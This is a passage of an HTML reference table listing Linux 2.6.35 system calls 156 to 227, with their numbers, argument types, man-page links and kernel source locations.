href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L4651" target="_blank" rel="noopener">kernel/sched.c:4651</a></td></tr><tr><td>156</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_setscheduler.2.html" target="_blank" rel="noopener">sys_sched_setscheduler</a></td><td>0x9c</td><td>pid_t pid</td><td>int policy</td><td><a href="http://lxr.free-electrons.com/source/include/linux/sched.h?v=2.6.35#L46" target="_blank" rel="noopener">struct sched_param __user *param</a></td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L4601" target="_blank" rel="noopener">kernel/sched.c:4601</a></td></tr><tr><td>157</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_getscheduler.2.html" target="_blank" rel="noopener">sys_sched_getscheduler</a></td><td>0x9d</td><td>pid_t pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L4625" target="_blank" rel="noopener">kernel/sched.c:4625</a></td></tr><tr><td>158</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_yield.2.html" target="_blank" rel="noopener">sys_sched_yield</a></td><td>0x9e</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L4851" target="_blank" rel="noopener">kernel/sched.c:4851</a></td></tr><tr><td>159</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_get_priority_max.2.html" target="_blank" rel="noopener">sys_sched_get_priority_max</a></td><td>0x9f</td><td>int policy</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L4989" target="_blank" rel="noopener">kernel/sched.c:4989</a></td></tr><tr><td>160</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_get_priority_min.2.html" target="_blank" rel="noopener">sys_sched_get_priority_min</a></td><td>0xa0</td><td>int policy</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L5014" target="_blank" rel="noopener">kernel/sched.c:5014</a></td></tr><tr><td>161</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_rr_get_interval.2.html" target="_blank" rel="noopener">sys_sched_rr_get_interval</a></td><td>0xa1</td><td>pid_t pid</td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="noopener">struct timespec __user *interval</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L5039" target="_blank" rel="noopener">kernel/sched.c:5039</a></td></tr><tr><td>162</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/nanosleep.2.html" target="_blank" rel="noopener">sys_nanosleep</a></td><td>0xa2</td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="noopener">struct timespec __user *rqtp</a></td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="noopener">struct timespec __user *rmtp</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/hrtimer.c?v=2.6.35#L1606" target="_blank" rel="noopener">kernel/hrtimer.c:1606</a></td></tr><tr><td>163</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mremap.2.html" target="_blank" rel="noopener">sys_mremap</a></td><td>0xa3</td><td>unsigned long addr</td><td>unsigned long old_len</td><td>unsigned long new_len</td><td>unsigned long flags</td><td>unsigned long new_addr</td><td><a href="http://lxr.free-electrons.com/source/mm/mremap.c?v=2.6.35#L510" target="_blank" rel="noopener">mm/mremap.c:510</a></td></tr><tr><td>164</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setresuid16.2.html" target="_blank" rel="noopener">sys_setresuid16</a></td><td>0xa4</td><td>old_uid_t ruid</td><td>old_uid_t euid</td><td>old_uid_t suid</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L75" target="_blank" rel="noopener">kernel/uid16.c:75</a></td></tr><tr><td>165</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getresuid16.2.html" target="_blank" rel="noopener">sys_getresuid16</a></td><td>0xa5</td><td>old_uid_t __user *ruid</td><td>old_uid_t __user *euid</td><td>old_uid_t __user *suid</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L84" target="_blank" rel="noopener">kernel/uid16.c:84</a></td></tr><tr><td>166</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/vm86.2.html" target="_blank" rel="noopener">sys_vm86</a></td><td>0xa6</td><td>unsigned long</td><td>unsigned long</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19" target="_blank" rel="noopener">struct pt_regs *</a></td><td>-</td><td>-</td><td>[not found:](<a href="http://lxr.free-electrons.com/source/not" target="_blank" rel="noopener">http://lxr.free-electrons.com/source/not</a> found?v=2.6.35#L)</td></tr><tr><td>167</td><td>not implemented</td><td>0xa7</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>168</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/poll.2.html" target="_blank" rel="noopener">sys_poll</a></td><td>0xa8</td><td><a href="http://lxr.free-electrons.com/source/include/asm-generic/poll.h?v=2.6.35#L31" target="_blank" rel="noopener">struct pollfd __user *ufds</a></td><td>unsigned int nfds</td><td>long timeout</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/select.c?v=2.6.35#L915" target="_blank" rel="noopener">fs/select.c:915</a></td></tr><tr><td>169</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/nfsservctl.2.html" target="_blank" rel="noopener">sys_nfsservctl</a></td><td>0xa9</td><td>int cmd</td><td><a href="http://lxr.free-electrons.com/source/include/linux/nfsd/syscall.h?v=2.6.35#L77" target="_blank" rel="noopener">struct nfsctl_arg __user *arg</a></td><td>void __user *res</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/nfsctl.c?v=2.6.35#L86" target="_blank" rel="noopener">fs/nfsctl.c:86</a></td></tr><tr><td>170</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setresgid16.2.html" target="_blank" rel="noopener">sys_setresgid16</a></td><td>0xaa</td><td>old_gid_t rgid</td><td>old_gid_t egid</td><td>old_gid_t sgid</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L96" target="_blank" rel="noopener">kernel/uid16.c:96</a></td></tr><tr><td>171</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getresgid16.2.html" target="_blank" rel="noopener">sys_getresgid16</a></td><td>0xab</td><td>old_gid_t __user *rgid</td><td>old_gid_t __user *egid</td><td>old_gid_t __user *sgid</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L106" target="_blank" rel="noopener">kernel/uid16.c:106</a></td></tr><tr><td>172</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/prctl.2.html" target="_blank" rel="noopener">sys_prctl</a></td><td>0xac</td><td>int option</td><td>unsigned long arg2</td><td>unsigned long arg3</td><td>unsigned long arg4</td><td>unsigned long arg5</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1466" target="_blank" rel="noopener">kernel/sys.c:1466</a></td></tr><tr><td>173</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigreturn.2.html" target="_blank" rel="noopener">sys_rt_sigreturn</a></td><td>0xad</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19" target="_blank" rel="noopener">struct pt_regs *</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/kernel/entry.S?v=2.6.35#L771" target="_blank" rel="noopener">arch/alpha/kernel/entry.S:771</a></td></tr><tr><td>174</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigaction.2.html" target="_blank" rel="noopener">sys_rt_sigaction</a></td><td>0xae</td><td>int sig</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/signal.h?v=2.6.35#L123" target="_blank" rel="noopener">const struct sigaction __user *act</a></td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/signal.h?v=2.6.35#L123" target="_blank" rel="noopener">struct sigaction __user *oact</a></td><td>size_t sigsetsize</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2624" target="_blank" rel="noopener">kernel/signal.c:2624</a></td></tr><tr><td>175</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigprocmask.2.html" target="_blank" rel="noopener">sys_rt_sigprocmask</a></td><td>0xaf</td><td>int how</td><td>sigset_t __user *set</td><td>sigset_t __user *oset</td><td>size_t sigsetsize</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2111" target="_blank" rel="noopener">kernel/signal.c:2111</a></td></tr><tr><td>176</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigpending.2.html" target="_blank" rel="noopener">sys_rt_sigpending</a></td><td>0xb0</td><td>sigset_t __user *set</td><td>size_t sigsetsize</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2171" target="_blank" rel="noopener">kernel/signal.c:2171</a></td></tr><tr><td>177</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigtimedwait.2.html" target="_blank" rel="noopener">sys_rt_sigtimedwait</a></td><td>0xb1</td><td>const sigset_t __user *uthese</td><td>siginfo_t __user *uinfo</td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="noopener">const struct timespec __user *uts</a></td><td>size_t sigsetsize</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2242" target="_blank" rel="noopener">kernel/signal.c:2242</a></td></tr><tr><td>178</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigqueueinfo.2.html" target="_blank" rel="noopener">sys_rt_sigqueueinfo</a></td><td>0xb2</td><td>int pid</td><td>int sig</td><td>siginfo_t __user *uinfo</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2404" target="_blank" rel="noopener">kernel/signal.c:2404</a></td></tr><tr><td>179</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigsuspend.2.html" target="_blank" rel="noopener">sys_rt_sigsuspend</a></td><td>0xb3</td><td>sigset_t __user *unewset</td><td>size_t sigsetsize</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2710" target="_blank" rel="noopener">kernel/signal.c:2710</a></td></tr><tr><td>180</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pread64.2.html" target="_blank" rel="noopener">sys_pread64</a></td><td>0xb4</td><td>unsigned int fd</td><td>char __user *buf</td><td>size_t count</td><td>loff_t pos</td><td>-</td><td>[not found:](<a href="http://lxr.free-electrons.com/source/not" target="_blank" rel="noopener">http://lxr.free-electrons.com/source/not</a> found?v=2.6.35#L)</td></tr><tr><td>181</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pwrite64.2.html" target="_blank" rel="noopener">sys_pwrite64</a></td><td>0xb5</td><td>unsigned int fd</td><td>const char __user *buf</td><td>size_t count</td><td>loff_t pos</td><td>-</td><td>[not found:](<a href="http://lxr.free-electrons.com/source/not" target="_blank" rel="noopener">http://lxr.free-electrons.com/source/not</a> found?v=2.6.35#L)</td></tr><tr><td>182</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/chown16.2.html" target="_blank" rel="noopener">sys_chown16</a></td><td>0xb6</td><td>const char __user *filename</td><td>old_uid_t user</td><td>old_gid_t group</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L19" target="_blank" rel="noopener">kernel/uid16.c:19</a></td></tr><tr><td>183</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getcwd.2.html" target="_blank" rel="noopener">sys_getcwd</a></td><td>0xb7</td><td>char __user *buf</td><td>unsigned long size</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/dcache.c?v=2.6.35#L2104" target="_blank" rel="noopener">fs/dcache.c:2104</a></td></tr><tr><td>184</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/capget.2.html" target="_blank" rel="noopener">sys_capget</a></td><td>0xb8</td><td>cap_user_header_t header</td><td>cap_user_data_t dataptr</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/capability.c?v=2.6.35#L161" target="_blank" rel="noopener">kernel/capability.c:161</a></td></tr><tr><td>185</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/capset.2.html" target="_blank" rel="noopener">sys_capset</a></td><td>0xb9</td><td>cap_user_header_t header</td><td>const cap_user_data_t data</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/capability.c?v=2.6.35#L235" target="_blank" rel="noopener">kernel/capability.c:235</a></td></tr><tr><td>186</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sigaltstack.2.html" target="_blank" rel="noopener">sys_sigaltstack</a></td><td>0xba</td><td>const stack_t __user *</td><td>stack_t __user *</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19" target="_blank" rel="noopener">struct pt_regs *</a></td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/kernel/signal.c?v=2.6.35#L199" target="_blank" rel="noopener">arch/alpha/kernel/signal.c:199</a></td></tr><tr><td>187</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sendfile.2.html" target="_blank" rel="noopener">sys_sendfile</a></td><td>0xbb</td><td>int out_fd</td><td>int in_fd</td><td>off_t __user *offset</td><td>size_t count</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/read_write.c?v=2.6.35#L897" target="_blank" rel="noopener">fs/read_write.c:897</a></td></tr><tr><td>188</td><td>not implemented</td><td>0xbc</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>189</td><td>not implemented</td><td>0xbd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>190</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/vfork.2.html" target="_blank" rel="noopener">sys_vfork</a></td><td>0xbe</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19" target="_blank" rel="noopener">struct pt_regs *</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/kernel/entry.S?v=2.6.35#L746" target="_blank" rel="noopener">arch/alpha/kernel/entry.S:746</a></td></tr><tr><td>191</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getrlimit.2.html" target="_blank" rel="noopener">sys_getrlimit</a></td><td>0xbf</td><td>unsigned int resource</td><td><a href="http://lxr.free-electrons.com/source/include/linux/resource.h?v=2.6.35#L41" target="_blank" rel="noopener">struct rlimit __user *rlim</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1237" target="_blank" rel="noopener">kernel/sys.c:1237</a></td></tr><tr><td>192</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mmap_pgoff.2.html" target="_blank" rel="noopener">sys_mmap_pgoff</a></td><td>0xc0</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/mmap.c?v=2.6.35#L1091" target="_blank" rel="noopener">mm/mmap.c:1091</a></td></tr><tr><td>193</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/truncate64.2.html" target="_blank" rel="noopener">sys_truncate64</a></td><td>0xc1</td><td>const char __user *path</td><td>loff_t length</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="http://lxr.free-electrons.com/source/not" target="_blank" rel="noopener">http://lxr.free-electrons.com/source/not</a> found?v=2.6.35#L)</td></tr><tr><td>194</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ftruncate64.2.html" target="_blank" rel="noopener">sys_ftruncate64</a></td><td>0xc2</td><td>unsigned int fd</td><td>loff_t length</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="http://lxr.free-electrons.com/source/not" target="_blank" rel="noopener">http://lxr.free-electrons.com/source/not</a> found?v=2.6.35#L)</td></tr><tr><td>195</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/stat64.2.html" target="_blank" rel="noopener">sys_stat64</a></td><td>0xc3</td><td>char __user *filename</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/stat.h?v=2.6.35#L25" target="_blank" rel="noopener">struct stat64 __user *statbuf</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L358" target="_blank" rel="noopener">fs/stat.c:358</a></td></tr><tr><td>196</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lstat64.2.html" target="_blank" rel="noopener">sys_lstat64</a></td><td>0xc4</td><td>char __user *filename</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/stat.h?v=2.6.35#L25" target="_blank" rel="noopener">struct stat64 __user *statbuf</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L369" target="_blank" rel="noopener">fs/stat.c:369</a></td></tr><tr><td>197</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fstat64.2.html" target="_blank" rel="noopener">sys_fstat64</a></td><td>0xc5</td><td>unsigned long fd</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/stat.h?v=2.6.35#L25" target="_blank" rel="noopener">struct stat64 __user *statbuf</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L380" target="_blank" rel="noopener">fs/stat.c:380</a></td></tr><tr><td>198</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lchown.2.html" target="_blank" rel="noopener">sys_lchown</a></td><td>0xc6</td><td>const char __user *filename</td><td>uid_t user</td><td>gid_t group</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L583" target="_blank" rel="noopener">fs/open.c:583</a></td></tr><tr><td>199</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getuid.2.html" target="_blank" rel="noopener">sys_getuid</a></td><td>0xc7</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/timer.c?v=2.6.35#L1359" target="_blank" rel="noopener">kernel/timer.c:1359</a></td></tr><tr><td>200</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getgid.2.html" target="_blank" rel="noopener">sys_getgid</a></td><td>0xc8</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/timer.c?v=2.6.35#L1371" target="_blank" rel="noopener">kernel/timer.c:1371</a></td></tr><tr><td>201</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/geteuid.2.html" target="_blank" rel="noopener">sys_geteuid</a></td><td>0xc9</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/timer.c?v=2.6.35#L1365" target="_blank" rel="noopener">kernel/timer.c:1365</a></td></tr><tr><td>202</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getegid.2.html" target="_blank" rel="noopener">sys_getegid</a></td><td>0xca</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/timer.c?v=2.6.35#L1377" target="_blank" rel="noopener">kernel/timer.c:1377</a></td></tr><tr><td>203</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setreuid.2.html" target="_blank" rel="noopener">sys_setreuid</a></td><td>0xcb</td><td>uid_t ruid</td><td>uid_t euid</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L594" target="_blank" rel="noopener">kernel/sys.c:594</a></td></tr><tr><td>204</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setregid.2.html" target="_blank" rel="noopener">sys_setregid</a></td><td>0xcc</td><td>gid_t rgid</td><td>gid_t egid</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L484" target="_blank" rel="noopener">kernel/sys.c:484</a></td></tr><tr><td>205</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getgroups.2.html" target="_blank" rel="noopener">sys_getgroups</a></td><td>0xcd</td><td>int gidsetsize</td><td>gid_t __user *grouplist</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/groups.c?v=2.6.35#L203" target="_blank" rel="noopener">kernel/groups.c:203</a></td></tr><tr><td>206</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setgroups.2.html" target="_blank" rel="noopener">sys_setgroups</a></td><td>0xce</td><td>int gidsetsize</td><td>gid_t __user *grouplist</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/groups.c?v=2.6.35#L232" target="_blank" rel="noopener">kernel/groups.c:232</a></td></tr><tr><td>207</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fchown.2.html" target="_blank" rel="noopener">sys_fchown</a></td><td>0xcf</td><td>unsigned int fd</td><td>uid_t user</td><td>gid_t group</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L602" target="_blank" rel="noopener">fs/open.c:602</a></td></tr><tr><td>208</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setresuid.2.html" target="_blank" rel="noopener">sys_setresuid</a></td><td>0xd0</td><td>uid_t ruid</td><td>uid_t euid</td><td>uid_t suid</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L696" target="_blank" rel="noopener">kernel/sys.c:696</a></td></tr><tr><td>209</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getresuid.2.html" target="_blank" rel="noopener">sys_getresuid</a></td><td>0xd1</td><td>uid_t __user *ruid</td><td>uid_t __user *euid</td><td>uid_t __user *suid</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L746" target="_blank" rel="noopener">kernel/sys.c:746</a></td></tr><tr><td>210</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setresgid.2.html" target="_blank" rel="noopener">sys_setresgid</a></td><td>0xd2</td><td>gid_t rgid</td><td>gid_t egid</td><td>gid_t sgid</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L761" target="_blank" rel="noopener">kernel/sys.c:761</a></td></tr><tr><td>211</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getresgid.2.html" target="_blank" rel="noopener">sys_getresgid</a></td><td>0xd3</td><td>gid_t __user *rgid</td><td>gid_t __user *egid</td><td>gid_t __user *sgid</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L800" target="_blank" rel="noopener">kernel/sys.c:800</a></td></tr><tr><td>212</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/chown.2.html" target="_blank" rel="noopener">sys_chown</a></td><td>0xd4</td><td>const char __user *filename</td><td>uid_t user</td><td>gid_t group</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L539" target="_blank" rel="noopener">fs/open.c:539</a></td></tr><tr><td>213</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setuid.2.html" target="_blank" rel="noopener">sys_setuid</a></td><td>0xd5</td><td>uid_t uid</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L655" target="_blank" rel="noopener">kernel/sys.c:655</a></td></tr><tr><td>214</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setgid.2.html" target="_blank" rel="noopener">sys_setgid</a></td><td>0xd6</td><td>gid_t gid</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L531" target="_blank" rel="noopener">kernel/sys.c:531</a></td></tr><tr><td>215</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setfsuid.2.html" target="_blank" rel="noopener">sys_setfsuid</a></td><td>0xd7</td><td>uid_t uid</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L819" target="_blank" rel="noopener">kernel/sys.c:819</a></td></tr><tr><td>216</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setfsgid.2.html" target="_blank" rel="noopener">sys_setfsgid</a></td><td>0xd8</td><td>gid_t gid</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L852" target="_blank" rel="noopener">kernel/sys.c:852</a></td></tr><tr><td>217</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pivot_root.2.html" target="_blank" rel="noopener">sys_pivot_root</a></td><td>0xd9</td><td>const char __user *new_root</td><td>const char __user *put_old</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namespace.c?v=2.6.35#L2184" target="_blank" rel="noopener">fs/namespace.c:2184</a></td></tr><tr><td>218</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mincore.2.html" target="_blank" rel="noopener">sys_mincore</a></td><td>0xda</td><td>unsigned long start</td><td>size_t len</td><td>unsigned char __user * vec</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/mincore.c?v=2.6.35#L256" target="_blank" rel="noopener">mm/mincore.c:256</a></td></tr><tr><td>219</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/madvise.2.html" target="_blank" rel="noopener">sys_madvise</a></td><td>0xdb</td><td>unsigned long start</td><td>size_t len</td><td>int behavior</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/madvise.c?v=2.6.35#L335" target="_blank" rel="noopener">mm/madvise.c:335</a></td></tr><tr><td>220</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getdents64.2.html" target="_blank" rel="noopener">sys_getdents64</a></td><td>0xdc</td><td>unsigned int fd</td><td><a href="http://lxr.free-electrons.com/source/include/linux/dirent.h?v=2.6.35#L4" target="_blank" rel="noopener">struct linux_dirent64 __user *dirent</a></td><td>unsigned int count</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/readdir.c?v=2.6.35#L273" target="_blank" rel="noopener">fs/readdir.c:273</a></td></tr><tr><td>221</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fcntl64.2.html" target="_blank" rel="noopener">sys_fcntl64</a></td><td>0xdd</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/fcntl.c?v=2.6.35#L452" target="_blank" rel="noopener">fs/fcntl.c:452</a></td></tr><tr><td>222</td><td>not implemented</td><td>0xde</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>223</td><td>not implemented</td><td>0xdf</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>224</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/gettid.2.html" target="_blank" rel="noopener">sys_gettid</a></td><td>0xe0</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/timer.c?v=2.6.35#L1493" target="_blank" rel="noopener">kernel/timer.c:1493</a></td></tr><tr><td>225</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/readahead.2.html" target="_blank" rel="noopener">sys_readahead</a></td><td>0xe1</td><td>int fd</td><td>loff_t offset</td><td>size_t count</td><td>-</td><td>-</td><td>[not found:](<a href="http://lxr.free-electrons.com/source/not" target="_blank" rel="noopener">http://lxr.free-electrons.com/source/not</a> found?v=2.6.35#L)</td></tr><tr><td>226</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setxattr.2.html" target="_blank" rel="noopener">sys_setxattr</a></td><td>0xe2</td><td>const char __user *path</td><td>const char __user *name</td><td>const void __user *value</td><td>size_t size</td><td>int flags</td><td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L279" target="_blank" rel="noopener">fs/xattr.c:279</a></td></tr><tr><td>227</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lsetxattr.2.html" target="_blank" rel="noopener">sys_lsetxattr</a></td><td>0xe3</td><td>const char __user 